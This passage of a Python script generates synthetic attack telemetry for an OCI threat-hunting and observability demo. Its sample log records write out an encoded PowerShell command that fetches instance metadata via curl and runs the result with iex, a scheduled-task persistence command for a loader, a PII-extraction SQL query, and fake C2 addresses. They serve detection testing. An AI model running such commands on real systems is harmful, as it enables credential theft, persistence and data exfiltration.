            "secondary_namespace": "oci_observability_demo",
            "name": "multicloud.aws.cloudtrail_suspicious_api_calls",
            "timestamp": d5_ts3,
            "value": 14.0,
            "dimensions": {"cloud_provider": "AWS", "region": aws_region, "c2_ip": "198.51.100.214", "trace_id": day_traces[5]},
        },
        {
            "namespace": "octo_multicloud_ops",
            "secondary_namespace": "oci_observability_demo",
            "name": "multicloud.azure.entra_sp_credential_modifications",
            "timestamp": d4_ts2,
            "value": 6.0,
            "dimensions": {"cloud_provider": "Azure", "region": azure_region, "c2_ip": "198.41.200.113", "trace_id": day_traces[4]},
        },
        {
            "namespace": "octo_multicloud_ops",
            "secondary_namespace": "oci_observability_demo",
            "name": "multicloud.gcp.iam_and_firewall_drift_events",
            "timestamp": d6_ts1,
            "value": 9.0,
            "dimensions": {"cloud_provider": "GCP", "region": gcp_region, "c2_ip": "198.51.100.214", "trace_id": day_traces[6]},
        },
        {
            "namespace": "octo_multicloud_ops",
            "secondary_namespace": "oci_observability_demo",
            "name": "multicloud.oci.cross_csp_correlated_incidents",
            "timestamp": d7_ts3,
            "value": 4.0,
            "dimensions": {"cloud_provider": "OCI", "region": oci_region, "c2_ip": "198.51.100.214", "trace_id": day_traces[7]},
        },
        {
            "namespace": "octo_ac_hunter",
            "secondary_namespace": "oci_observability_demo",
            "name": "ac_hunter.rita_beacon_score_max",
            "timestamp": d7_ts2,
            "value": 96.4,
            "dimensions": {"host": "kingslanding", "c2_ip": "198.51.100.214", "port": "8443", "trace_id": day_traces[7]},
        },
        {
            "namespace": "octo_ac_hunter",
            "secondary_namespace": "oci_observability_demo",
            "name": "ac_hunter.long_connection_max_duration_sec",
            "timestamp": d7_ts2,
            "value": 28400.0,
            "dimensions": {"host": "kingslanding", "c2_ip": "198.51.100.214", "port": "8443", "trace_id": day_traces[7]},
        },
        {
            "namespace": "octo_ac_hunter",
            "secondary_namespace": "oci_observability_demo",
            "name": "ac_hunter.dns_tunnel_distinct_subdomains",
            "timestamp": d7_ts1,
            "value": 342.0,
            "dimensions": {"host": "kingslanding", "fqdn_zone": "exfil.c2-stage.example.net", "trace_id": day_traces[7]},
        },
        {
            "namespace": "octo_ac_hunter",
            "secondary_namespace": "oci_observability_demo",
            "name": "ac_hunter.composite_host_threat_score_max",
            "timestamp": d7_ts3,
            "value": 97.0,
            "dimensions": {"host": "kingslanding", "c2_ip": "198.51.100.214", "trace_id": day_traces[7]},
        },
    ]

    all_logs = background_logs + attack_logs + multicloud_logs + ac_hunter_telemetry
    distinct_dates = sorted({row["time"][:10] for row in all_logs})
    payload = {
        "schema": "oci-demo.seven-day-storyline-2026/v1",
        "seed": seed,
        "distinct_dates": distinct_dates,
        "days": SEVEN_DAY_KILL_CHAIN_DAYS,
        "day_traces": day_traces,
        "background_logs": background_logs,
        "attack_logs": attack_logs,
        "multicloud_logs": multicloud_logs,
        "ac_hunter_telemetry": ac_hunter_telemetry,
        "all_logs": all_logs,
        "metrics": storyline_metrics,
        "multicloud_metrics": multicloud_metrics,
        "apm_traces": storyline_apm_traces,
        "langfuse_traces": storyline_langfuse_traces,
        "datasafe_events": storyline_datasafe_events,
        "storyline_counts": {
            "distinct_dates": len(distinct_dates),
            "background_logs": len(background_logs),
            "attack_logs": len(attack_logs),
            "multicloud_logs": len(multicloud_logs),
            "ac_hunter_telemetry": len(ac_hunter_telemetry),
            "total_logs": len(all_logs),
            "metrics": len(storyline_metrics),
            "multicloud_metrics": len(multicloud_metrics),
            "apm_traces": len(storyline_apm_traces),
            "langfuse_traces": len(storyline_langfuse_traces),
            "datasafe_events": len(storyline_datasafe_events),
        },
    }
    return mask_payload(payload, mode=mask_mode) if mask_mode != "off" else payload


def generate_campaign_bundle(
    *,
    seed: str = "20260901",
    mask_mode: str = "partial",
    base_time: str = "2026-09-15T14:00:00Z",
    env: Mapping[str, str] | None = None,
) -> dict[str, Any]:
    """Generate correlated synthetic Logs, Metrics, APM OTel Traces, Data Safe DB Audit events, and 7-day storyline."""
    ctx = dict(os.environ if env is None else env)
    prefix = ctx.get("OCI_DEMO_PREFIX", "oci-demo")
    region = ctx.get("OCI_REGION") or "-".join(("eu", "frankfurt", "1"))
    la_group = ctx.get("LA_SECURITY_LOG_GROUP_OCID") or ctx.get("OCI_LOG_ANALYTICS_LOG_GROUP_ID", f"{prefix}-security-logs")
    datasafe_target = ctx.get("DATASAFE_TARGET_DB_OCID") or _synthetic_ocid("datasafetargetdatabase", region, seed, "atp-shared")
    atp_id = ctx.get("SHARED_ADB_OCID") or _synthetic_ocid("autonomousdatabase", region, seed, "guardian-adb")

    traces = {
        "PEAK-HUNT-2026-01": _deterministic_hex(seed, "trace-01", 32),
        "PEAK-HUNT-2026-02": _deterministic_hex(seed, "trace-02", 32),
        "PEAK-HUNT-2026-03": _deterministic_hex(seed, "trace-03", 32),
        "PEAK-HUNT-2026-04": _deterministic_hex(seed, "trace-04", 32),
    }

    logs = [
        # PEAK-HUNT-2026-01: Trellix JSCeal Node.js + Axios npm supply chain
        {
            "timestamp": base_time,
            "hunt_id": "PEAK-HUNT-2026-01",
            "campaign_id": "TRELLIX-2026-04",
            "log_source": "Linux Auditd Logs",
            "host_name": f"{prefix}-oke-worker-01",
            "pod_name": "portal-web-7d9c8b",
            "namespace": "oci-demo",
            "parent_process_name": "node",
            "process_name": "pwsh",
            "command_line": "pwsh -NoProfile -enc aWV4IChjdXJsIC1zIGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvb3BjL3YyL2luc3RhbmNlLyk=",
            "imds_probe": "169.254.169.254/opc/v2/instance/",
            "trace_id": traces["PEAK-HUNT-2026-01"],
            "span_id": _deterministic_hex(seed, "span-01a", 16),
            "severity": "CRITICAL",
        },
        {
            "timestamp": base_time,
            "hunt_id": "PEAK-HUNT-2026-01",
            "campaign_id": "TRELLIX-2026-05",
            "log_source": "OKE Application Logs",
            "host_name": f"{prefix}-oke-worker-01",
            "pod_name": "crm-portal-6b8f4d",
            "namespace": "oci-demo",
            "message": "npm_package_name=axios postinstall hook initiated unexpected egress_anomaly to external collector",
            "destination_ip": "198.51.100.77",
            "trace_id": traces["PEAK-HUNT-2026-01"],
            "span_id": _deterministic_hex(seed, "span-01b", 16),
            "severity": "HIGH",
        },
        # PEAK-HUNT-2026-02: Trellix APT28 CVE-2026-21509 OLE Bypass + Bitter APT BDarkRAT + Cryptominer
        {
            "timestamp": base_time,
            "hunt_id": "PEAK-HUNT-2026-02",
            "campaign_id": "TRELLIX-2026-01",
            "log_source": "Windows Sysmon Events",
            "event_id": "1",
            "host_name": f"{prefix}-ad-member-01",
            "user_name": "diplomatic.envoy@example.com",
            "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "command_line": "schtasks.exe /create /tn OfficeUpdateOLE_cve-2026-21509 /tr C:\\ProgramData\\BDarkLoader.exe /sc minute /mo 15",
            "destination_port": 8443,
            "cpu_utilization_pct": 96.4,
            "trace_id": traces["PEAK-HUNT-2026-02"],
            "span_id": _deterministic_hex(seed, "span-02a", 16),
            "severity": "CRITICAL",
        },
        # PEAK-HUNT-2026-03: CrowdStrike 2026 82% Malware-Free LotL & Edge/Cloud Management Drift
        {
            "timestamp": base_time,
            "hunt_id": "PEAK-HUNT-2026-03",
            "campaign_id": "CS-OVERWATCH-2026-02",
            "log_source": "OCI Audit Logs",
            "event_name": "GenerateAutonomousDatabaseWallet",
            "principal_name": "contractor.ops@example.com",
            "principal_ocid": _synthetic_ocid("user", region, seed, "contractor-ops"),
            "client_ip": "203.0.113.88",
            "user_agent": "OCI-Python-SDK/2.126.0 (screenconnect-relay)",
            "compartment_name": f"{prefix}-database",
            "target_resource_ocid": atp_id,
            "trace_id": traces["PEAK-HUNT-2026-03"],
            "span_id": _deterministic_hex(seed, "span-03a", 16),
            "severity": "HIGH",
        },
        # PEAK-HUNT-2026-04: CrowdStrike 2026 AI-Agent M-ATH Burst -> Data Safe Sensitive DB Extraction
        {
            "timestamp": base_time,
            "hunt_id": "PEAK-HUNT-2026-04",
            "campaign_id": "CS-OVERWATCH-2026-01",
            "log_source": "OCI API Gateway Access Logs",
            "request_path": "/api/v1/customers/export",
            "http_status": 200,
            "response_time_ms": 42,
            "agentic_burst_score": 3.4,
            "client_ip": "192.0.2.119",
            "principal_name": "ai-agent-probe@example.com",
            "trace_id": traces["PEAK-HUNT-2026-04"],
            "span_id": _deterministic_hex(seed, "span-04a", 16),
            "severity": "CRITICAL",
        },
    ]

    metrics = [
        {
            "namespace": "oci_demo_security_melts",
            "name": "oci_security_hunt.jsceal_node_spawn_count",
            "timestamp": base_time,
            "value": 4.0,
            "dimensions": {"hunt_id": "PEAK-HUNT-2026-01", "campaign": "TRELLIX-2026-04", "trace_id": traces["PEAK-HUNT-2026-01"]},
        },
        {
            "namespace": "oci_demo_security_melts",
            "name": "oci_security_hunt.npm_supply_chain_egress_bytes",
            "timestamp": base_time,
            "value": 184320.0,
            "dimensions": {"hunt_id": "PEAK-HUNT-2026-01", "campaign": "TRELLIX-2026-05", "trace_id": traces["PEAK-HUNT-2026-01"]},
        },
        {
            "namespace": "oci_demo_security_melts",
            "name": "oci_security_hunt.cpu_anomaly",
            "timestamp": base_time,
            "value": 96.4,
            "dimensions": {"hunt_id": "PEAK-HUNT-2026-02", "campaign": "TRELLIX-2026-01", "trace_id": traces["PEAK-HUNT-2026-02"]},
        },
        {
            "namespace": "oci_demo_security_melts",
            "name": "oci_security_hunt.lotl_admin_drift_count",
            "timestamp": base_time,
            "value": 7.0,
            "dimensions": {"hunt_id": "PEAK-HUNT-2026-03", "campaign": "CS-OVERWATCH-2026-02", "trace_id": traces["PEAK-HUNT-2026-03"]},
        },
        {
            "namespace": "oci_demo_security_melts",
            "name": "oci_security_hunt.math_burst_score",
            "timestamp": base_time,
            "value": 3.4,
            "dimensions": {"hunt_id": "PEAK-HUNT-2026-04", "campaign": "CS-OVERWATCH-2026-01", "trace_id": traces["PEAK-HUNT-2026-04"]},
        },
        {
            "namespace": "oci_demo_security_melts",
            "name": "oci_datasafe.sensitive_query_count",
            "timestamp": base_time,
            "value": 1250.0,
            "dimensions": {"hunt_id": "PEAK-HUNT-2026-04", "campaign": "CS-OVERWATCH-2026-04", "trace_id": traces["PEAK-HUNT-2026-04"]},
        },
    ]

    apm_traces = [
        {
            "trace_id": traces["PEAK-HUNT-2026-01"],
            "span_id": _deterministic_hex(seed, "span-01a", 16),
            "service_name": "portal-web",
            "operation_name": "axios.http.egress_hook",
            "status": "ERROR",
            "duration_ms": 318,
            "attributes": {
                "hunt.id": "PEAK-HUNT-2026-01",
                "component": "nodejs-worker",
                "library.name": "axios",
                "custom.child_process_spawn": "true",
                "peer.service": "untrusted-registry-telemetry",
            },
        },
        {
            "trace_id": traces["PEAK-HUNT-2026-04"],
            "span_id": _deterministic_hex(seed, "span-04a", 16),
            "service_name": "enterprise-crm-api",
            "operation_name": "GET /api/v1/customers/export",
            "status": "OK",
            "duration_ms": 42,
            "attributes": {
                "hunt.id": "PEAK-HUNT-2026-04",
                "math.agentic_burst_score": 3.4,
                "db.system": "oracle",
                "db.target_id": atp_id,
                "db.datasafe.sensitive_table_access": "true",
            },
        },
    ]

    datasafe_events = [
        {
            "timestamp": base_time,
            "hunt_id": "PEAK-HUNT-2026-04",
            "campaign_id": "CS-OVERWATCH-2026-04",
            "log_source": "OCI Data Safe Unified Audit Logs",
            "datasafe_target_ocid": datasafe_target,
            "database_ocid": atp_id,
            "db_user": "CRM_APP",
            "os_user": "agent-runner",
            "client_host": "192.0.2.119",
            "client_program_name": "python-oracledb-agentic-probe",
            "audit_action": "SELECT",
            "object_schema": "CRM_CORE",
            "object_name": "CUSTOMER_PII",
            "sql_text": "SELECT customer_id, email, card_number, api_token FROM CRM_CORE.CUSTOMER_PII FETCH FIRST 1000 ROWS ONLY",
            "sample_sensitive_row": {
                "customer_email": "alice.executive@example.com",
                "card_number": "4111-2222-3333-4242",
                "api_token": "sk-live-9876543210abcdef",
            },
            "datasafe_security_assessment": {
                "finding_key": "ORA-DS-PRIV-004",
                "severity": "HIGH",
                "title": "Application schema queried sensitive PII columns at anomalous velocity",
                "masking_policy": f"{prefix}-datasafe-masking-policy",
            },
            "trace_id": traces["PEAK-HUNT-2026-04"],
        }
    ]

    storyline_7day = generate_7day_storyline_bundle(
        seed=seed,
        mask_mode="off",
        reference_time=base_time,
        env=ctx,
    )

    raw_bundle = {
        "schema": "oci-demo.synthetic-campaign-2026/v1",
        "seed": seed,
        "redaction_mode": mask_mode,
        "log_analytics_group": la_group,
        "peak_hunts": PEAK_HUNTS_SUMMARY,
        "logs": logs,
        "metrics": metrics,
        "apm_traces": apm_traces,
        "datasafe_events": datasafe_events,
        "multicloud_logs": storyline_7day["multicloud_logs"],
        "ac_hunter_telemetry": storyline_7day["ac_hunter_telemetry"],
        "multicloud_metrics": storyline_7day["multicloud_metrics"],
        "storyline_7day": storyline_7day,
        "counts": {
            "peak_hunts": len(PEAK_HUNTS_SUMMARY),
            "logs": len(logs),
            "metrics": len(metrics),
            "apm_traces": len(apm_traces),
            "datasafe_events": len(datasafe_events),
        },
        "extended_counts": {
            "multicloud_logs": len(storyline_7day["multicloud_logs"]),
            "ac_hunter_telemetry": len(storyline_7day["ac_hunter_telemetry"]),
            "multicloud_metrics": len(storyline_7day["multicloud_metrics"]),
        },
    }
    return mask_payload(raw_bundle, mode=mask_mode)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--seed", default=os.getenv("DETECTIONS_SYNTHETIC_SEED", "20260901"))
    parser.add_argument("--mask", choices=("off", "partial", "strict"), default=os.getenv("DEMO_REDACTION_MODE", "partial"))
    parser.add_argument("--dry-run", action="store_true", help="Validate and print summary without writing files or calling OCI")
    parser.add_argument("--out-dir", type=Path, help="Optional directory to write correlated NDJSON and JSON artifacts")
    parser.add_argument("--storyline-out", type=Path, help="Optional path to write the 7-day storyline bundle JSON")
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    bundle = generate_campaign_bundle(seed=args.seed, mask_mode=args.mask)
    if args.out_dir:
        args.out_dir.mkdir(parents=True, exist_ok=True)
        (args.out_dir / "campaign_bundle_2026.json").write_text(
            json.dumps(bundle, indent=2, sort_keys=True) + "\n", encoding="utf-8"
        )
        ndjson_lines = [
            json.dumps(row, sort_keys=True)
            for row in bundle["logs"] + bundle["datasafe_events"] + bundle["storyline_7day"]["all_logs"]
        ]
        (args.out_dir / "log_analytics_2026.ndjson").write_text("\n".join(ndjson_lines) + "\n", encoding="utf-8")
    if args.storyline_out:
        args.storyline_out.parent.mkdir(parents=True, exist_ok=True)
        story = generate_7day_storyline_bundle(seed=args.seed, mask_mode="off")
        args.storyline_out.write_text(json.dumps(story, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    summary = {
        "schema": bundle["schema"],
        "seed": bundle["seed"],
        "redaction_mode": bundle["redaction_mode"],
        "counts": bundle["counts"],
        "extended_counts": bundle["extended_counts"],
        "storyline_7day_counts": bundle["storyline_7day"]["storyline_counts"],
        "sample_masked_datasafe": bundle["datasafe_events"][0]["sample_sensitive_row"],
        "sample_masked_ocid": bundle["datasafe_events"][0]["database_ocid"],
    }
    print(json.dumps(summary, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
